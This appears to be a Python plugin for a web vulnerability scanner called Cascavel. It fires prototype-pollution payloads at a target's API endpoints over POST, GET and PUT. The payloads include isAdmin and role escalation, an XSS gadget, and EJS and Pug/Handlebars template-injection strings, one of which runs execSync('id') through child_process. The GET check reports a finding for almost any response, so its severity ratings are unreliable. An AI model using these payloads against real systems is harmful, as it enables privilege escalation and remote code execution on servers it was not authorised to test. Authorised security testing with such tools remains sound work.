# plugins/prototype_pollution.py — Cascavel 2026 Intelligence
import requests
import json


PAGES = ["/", "/api/", "/api/v1/", "/api/v1/users", "/api/v1/settings",
         "/api/v1/config", "/api/v1/merge", "/api/v1/update",
         "/api/v1/preferences", "/api/deep-merge"]

# ──────────── PROTOTYPE POLLUTION PAYLOADS (2026 Expanded) ────────────
POST_PAYLOADS = [
    ({"__proto__": {"isAdmin": True}}, "__PROTO_ISADMIN"),
    ({"__proto__": {"role": "admin"}}, "__PROTO_ROLE"),
    ({"__proto__": {"polluted": "cascavel-test"}}, "__PROTO_CANARY"),
    ({"constructor": {"prototype": {"polluted": "cascavel-test"}}}, "CONSTRUCTOR_PROTO"),
    ({"__proto__": {"transport_url": "data:,alert(1)//"}}, "__PROTO_XSS_GADGET"),
    ({"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--require /proc/self/environ"}}, "__PROTO_RCE_PROBE"),
    # 2026 additions
    ({"__proto__": {"status": 200}}, "__PROTO_STATUS_OVERRIDE"),
    ({"__proto__": {"admin": True, "debug": True}}, "__PROTO_MULTI_FIELD"),
    ({"__proto__": {"outputFunctionName": "x;console.log(1)//"}}, "__PROTO_EJS_RCE"),
    ({"__proto__": {"client": True, "escapeFunction": "1;return global.process.mainModule.require('child_process').execSync('id')"}}, "__PROTO_PUGHBS"),
    ({"__proto__": {"allow_b_ody_overwrite": True}}, "__PROTO_BODY_PARSER"),
]

GET_PAYLOADS = [
    ("__proto__[polluted]=cascavel-test", "GET_PROTO"),
    ("constructor[prototype][polluted]=cascavel-test", "GET_CONSTRUCTOR"),
    ("__proto__.isAdmin=true", "GET_ISADMIN"),
    ("__proto__[status]=500", "GET_STATUS"),
    ("__proto__[admin]=true&__proto__[role]=admin", "GET_MULTI"),
]


def _test_post_proto(target, page, payload, method):
    """Testa prototype pollution via POST JSON."""
    url = f"http://{target}{page}"
    try:
        resp = requests.post(
            url, json=payload, timeout=5,
            headers={"Content-Type": "application/json"},
        )
        if resp.status_code in [200, 201]:
            sev, desc = _classify_proto_vuln(method, resp.text)
            return {
                "tipo": "PROTOTYPE_POLLUTION", "metodo": method,
                "pagina": page, "severidade": sev, "descricao": desc,
            }
    except Exception:
        pass
    return None


def _test_get_proto(target, page, payload, method):
    """Testa prototype pollution via GET query string."""
    try:
        resp = requests.get(f"http://{target}{page}?{payload}", timeout=5)
        if "cascavel-test" in resp.text or resp.status_code not in [400, 404, 500]:
            return {
                "tipo": "PROTOTYPE_POLLUTION_GET", "metodo": method,
                "pagina": page, "severidade": "ALTO",
                "descricao": f"Prototype pollution via GET — {method}",
            }
    except Exception:
        pass
    return None


def _test_text_plain(target, page):
    """Testa prototype pollution via text/plain Content-Type bypass."""
    try:
        resp = requests.post(
            f"http://{target}{page}",
            data='{"__proto__":{"polluted":"cascavel-test"}}',
            headers={"Content-Type": "text/plain"}, timeout=5,
        )
        if resp.status_code == 200 and "cascavel-test" in resp.text:
            return {
                "tipo": "PROTO_VIA_TEXT_PLAIN", "pagina": page,
                "severidade": "ALTO",
                "descricao": "Prototype pollution via text/plain Content-Type bypass!",
            }
    except Exception:
        pass
    return None


def _test_lodash_merge(target, page):
    """Testa lodash merge vulnerability."""
    try:
        resp = requests.put(
            f"http://{target}{page}",
            json={"__proto__": {"polluted": "cascavel-lodash-test"}},
            timeout=5,
        )
        if resp.status_code in [200, 204] and "cascavel" in resp.text:
            return {
                "tipo": "LODASH_MERGE_POLLUTION", "pagina": page,
                "severidade": "CRITICO",
                "descricao": "Lodash _.merge prototype pollution confirmada!",
            }
    except Exception:
        pass
    return None


def _classify_proto_vuln(method, text):
    """Classifica severidade e descrição de prototype pollution."""
    if "cascavel-test" in text:
        return "CRITICO", "Prototype pollution confirmada — canary refletido!"
    if "isAdmin" in method and "admin" in text.lower():
        return "CRITICO", "Privilege escalation via prototype pollution!"
    if "XSS_GADGET" in method:
        return "ALTO", "XSS gadget via transport_url (PortSwigger 2026)"
    if "RCE_PROBE" in method:
        return "CRITICO", "RCE probe via NODE_OPTIONS injection!"
    if "EJS_RCE" in method:
        return "CRITICO", "EJS RCE via outputFunctionName!"
    if "PUGHBS" in method:
        return "CRITICO", "Pug/Handlebars RCE via escapeFunction!"
    if "BODY_PARSER" in method:
        return "ALTO", "Body-parser override via __proto__!"
    return "MEDIO", f"Possível prototype pollution via {method}"


def run(target, ip, open_ports, banners):
    """
    Scanner Prototype Pollution 2026-Grade — POST, GET, PUT, RCE Gadgets.

    Técnicas: 11 POST payloads (isAdmin/role/transport_url XSS/EJS RCE/
    Pug-Handlebars RCE/body-parser override/NODE_OPTIONS), 5 GET payloads,
    text/plain bypass, lodash _.merge vulnerability, constructor.prototype,
    multi-field injection, status code override.
    """
    _ = (ip, open_ports, banners)
    vulns = []

    for page in PAGES:
        for payload, method in POST_PAYLOADS:
            vuln = _test_post_proto(target, page, payload, method)
            if vuln:
                vulns.append(vuln)

        for payload, method in GET_PAYLOADS:
            vuln = _test_get_proto(target, page, payload, method)
            if vuln:
                vulns.append(vuln)
                break

        tp = _test_text_plain(target, page)
        if tp:
            vulns.append(tp)

        lm = _test_lodash_merge(target, page)
        if lm:
            vulns.append(lm)

    return {
        "plugin": "prototype_pollution",
        "versao": "2026.1",
        "tecnicas": ["post_proto", "get_proto", "constructor_proto",
                      "text_plain_bypass", "lodash_merge", "ejs_rce",
                      "pug_handlebars_rce", "body_parser_override"],
        "resultados": vulns if vulns else "Nenhuma prototype pollution detectada",
    }
